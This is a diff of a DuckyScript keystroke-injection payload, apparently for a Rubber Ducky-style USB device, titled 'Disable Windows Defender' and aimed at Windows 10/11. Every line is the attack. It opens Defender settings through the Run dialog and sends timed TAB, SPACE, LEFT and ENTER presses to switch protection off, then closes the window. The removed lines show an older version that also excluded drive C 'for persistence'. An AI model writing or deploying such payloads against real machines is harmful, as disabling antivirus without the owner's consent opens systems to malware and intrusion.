@@ -2,35 +2,33 @@ REM Author: Pentestersploit/Adrilaw
 REM Github: https://github.com/Adrilaw
 REM Xda-developer: @Kidpentester
 REM Title: Disable Windows Defender
-REM Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
+REM Description: Opens security settings, disable Defender
 REM Target: Windows 10/11 
-REM Version: 1.2
-
-REM Pause for everything to recognize and be ready
-DELAY 2000
+REM Version: 2
 
 REM Open Windows Defender Settings
 GUI r
-DELAY 750
-STRING windowsdefender:
+DELAY 250
+STRING windowsdefender://threat/
 DELAY 
 ENTER
 
 REM Navigate to Manage Settings
-DELAY 10000
-ENTER
-DELAY 100
+
+REM ADJUST THIS VALUE ACCORDING THE MACHINE'S PERFORMANCE
+
+DELAY 1500
 TAB
 TAB
 TAB
 TAB
-DELAY 500
+DELAY 250
 ENTER
 DELAY 500
 SPACE
-DELAY 750
-TAB
-TAB
-SPACE
+DELAY 550
+LEFT
+DELAY 250
+ENTER
 DELAY 500
 ALT F4
